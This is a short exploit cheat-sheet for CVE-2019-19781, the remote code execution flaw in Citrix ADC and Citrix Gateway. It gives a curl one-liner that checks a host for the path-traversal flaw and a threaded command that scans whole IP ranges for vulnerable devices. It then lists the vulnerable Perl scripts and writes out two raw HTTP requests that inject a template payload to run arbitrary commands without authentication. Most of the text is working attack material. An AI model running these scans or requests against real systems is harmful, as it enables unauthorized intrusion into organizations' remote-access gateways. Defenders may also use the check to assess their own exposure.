CVE-2019-19781
 
Remote Code Execution (RCE) in Citrix Application Delivery Controller and Citrix Gateway
 
A vulnerability has been identified in Citrix Application Delivery Controller (ADC) formerly known as NetScaler ADC and Citrix Gateway formerly known as NetScaler Gateway that, if exploited, could allow an unauthenticated attacker to perform arbitrary code execution.
 
How to check for vulnerability?
curl -vk –path-as-is https://$TARGET/vpn/../vpns/ 2>&1 | grep “You don’t have permission to access /vpns/” >/dev/null && echo “VULNERABLE: $TARGET” || echo “MITIGATED: $TARGET”
 
@w4fz5uck5 -> curl threading checker
prips <IP_RANGE> | xargs -P 25 -I{} sh -c 'curl -vk -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" --path-as-is "http://{}/vpn/../vpns/" -m 10 2>&1 | grep "You don'\''t have permission to access /vpns/" && echo VULNERABLE: {} || echo NOT VULNERABLE: {}'

Vulnerable Perl scripts:
/vpn/../vpns/portal/scripts/newbm.pl
/vpn/../vpns/portal/scripts/rmbm.pl
/vpn/../vpns/portal/scripts/picktheme.pl
 
Exploit:
1st request
-----------
POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1
Host: $TARGET
NSC_USER: /../../../../netscaler/portal/templates/(value)
NSC_NONCE: (value)
Connection: close
Content-Length: 103
 
url=http://example.com&title=(value)&desc=[% template.new('BLOCK' = 'print `command`') %]
 
Second request
--------------
GET /vpns/portal/(value).xml HTTP/1.1
Host: $TARGET
NSC_USER: ../../../../netscaler/portal/templates/(value)
NSC_NONCE: (value)
Connection: close
Content-Length: 103
 
Written by Aliester Crowley
